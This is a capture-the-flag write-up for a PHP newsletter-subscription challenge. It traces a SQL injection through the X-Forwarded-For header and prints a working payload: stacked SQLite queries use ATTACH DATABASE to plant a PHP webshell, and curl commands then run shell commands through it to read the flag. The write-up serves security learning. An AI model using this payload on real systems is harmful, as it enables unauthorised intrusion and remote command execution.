# Intergalactic Post

> The biggest intergalactic newsletter agency has constantly been spreading misinformation about the energy crisis war. Bonnie's sources confirmed a hostile takeover of the agency took place a few months back, and we suspect the Golden Fang army is behind this. Ulysses found us a potential access point to their agency servers. Can you hack their newsletter subscribe portal and get us entry?

---

The target is a PHP web application.

## Endpoints

### `GET /`
- `IndexController.php`'s `index()`
- Renders `views/index.php`
- Contains subscription form (`POST /subscribe`) and that's pretty much it

### `POST /subscribe`

```http
POST /subscribe HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://localhost:1337
Connection: close
Referer: http://localhost:1337/
Upgrade-Insecure-Requests: 1

email=tgihf%40blah.com
```

- `POST /subscribe` calls `SubsController.php`'s `store()`.

```php
public function store($router) {
	$email = $_POST['email'];
	if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
		header('Location: /?success=false&msg=Please submit a valild email address!');
		exit;
	}
	$subscriber = new SubscriberModel;
	$subscriber->subscribe($email);
	header('Location: /?success=true&msg=Email subscribed successfully!');
	exit;
}
```

- Extracts email from `POST` body
- **Returns** an error if either of the following are true:
	- `email` is empty
	- `filter_var($email, FILTER_VALIDATE_EMAIL)` returns false
		- [filter_var($email, FILTER_VALIDATE_EMAIL)](https://www.w3schools.com/php/filter_validate_email.asp) is a built in way to validate the format of email address strings
- Calls `SubscriberModel.php`'s `subscribe()`

```php
public function subscribe($email) {
	$ip_address = $this->getSubscriberIP();
	return $this->database->subscribeUser($ip_address, $email);
}
```

- Calls `SubscriberModel.php`'s `getSubscriberIP()`
	- Returns `$_SERVER`'s `HTTP_X_FORWARDED_FOR`, `REMOTE_ADDR`, or `HTTP_CLIENT_IP` value if it exists
	- The `HTTP_X_FORWARDED_FOR` value is the value of the client's `X-Forwarded-For` header, if it exists

```php
public function getSubscriberIP() {
	if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
		return  $_SERVER["HTTP_X_FORWARDED_FOR"];
	} else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
		return $_SERVER["REMOTE_ADDR"];
	} else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
		return $_SERVER["HTTP_CLIENT_IP"];
	}
	return '';
}
```

- Then calls `Database.php`'s `subscribeUser()`
	- `ip_address` and `email` are concatenated directly into the `INSERT INTO` statement
	- This is a definite SQL injection vulnerability
	- `ip_address` is the request's `X-Forwarded-For` header, if it exists

```php
public function subscribeUser($ip_address, $email) {
	return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
}
```

## Subscriber SQL Injection to Command Execution

It is possible to inject into `subscribeUser()`'s `INSERT` statement by setting the `X-Forwarded-For` header in the HTTP `POST` request.

SQLite allows stacked queries. Thus, it is possible to finish the initial `INSERT` statement and inject arbitrary statements afterwards. Use the [ATTACH DATABASE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database) method to write a PHP webshell within the web root.

```http
POST /subscribe HTTP/1.1
Host: 68.183.37.6:31310
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://68.183.37.6:31310
Connection: close
Referer: http://68.183.37.6:31310/
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 1.2.3.4', 'tgihf@blah.com'); ATTACH DATABASE '/www/static/blah.php' as db; CREATE TABLE db.pwn (dataz text); INSERT INTO db.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--

email=tgihf%40blah.com
```

Leverage the webshell to determine the name of the flag file: `/flag_1d23c48aade7db8.txt`.

```bash
$ curl 'http://68.183.37.6:31310/static/blah.php?cmd=ls+/flag*' --output -
 I/flag_1d23c48aade7db8.txtwn (dataz text)
```

Read the flag.

```bash
$ curl 'http://68.183.37.6:31310/static/blah.php?cmd=cat+/flag_1d23c48aade7db8.txt' --output -
 IHTB{...} pwn (dataz text)
```
